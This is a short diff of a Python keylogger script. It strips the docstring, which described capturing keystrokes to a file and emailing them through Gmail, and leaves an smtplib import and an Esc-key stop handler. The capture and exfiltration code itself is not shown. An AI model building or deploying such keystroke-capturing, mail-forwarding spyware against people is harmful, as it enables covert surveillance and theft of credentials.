@@ -1,22 +1,4 @@
-'''
-Keyloggers are programs that capture your key strokes. They can be used to keep logs of everything you press
-    on the keyboard and can be used for malicious purposes, i.e.: spyware, stealing login credentials.
 
-Current keyloggers have lots of functionalities. They record and display the exact date and time of each keystroke,
-    on which application the keystrokes were entered, easy-to-read logs, etc.
-
-This program is simply a basic keylogger with limited functionality, which are to:
--> Capture and save your keystrokes to a "keylogger.txt" file
--> Send the contents of the file to your email (sender email is gmail with no two-factor authentication)
-
-To run: Open the file in terminal and enter "python keylogger.py".
-To escape: Press Esc key to exit the keylogger.
-
-Modules used:
--> smtplib (pre-installed on Python)
--> ssl (pre-installed on Python)
--> pynput (requires installation with "pip install pynput")
-'''
 
 # Defines an SMTP client session object to send mail to any internet machine with an SMTP or ESMTP listener daemon
 import smtplib
@@ -65,8 +47,7 @@ def on_key_press(Key):
 
 
 def on_key_release(Key):
-    # This stops the Listener/Keylogger.
-    # You can use any key you like by replacing "esc" with the key of your choice
+
     if (Key == keyboard.Key.esc):
         return False
 
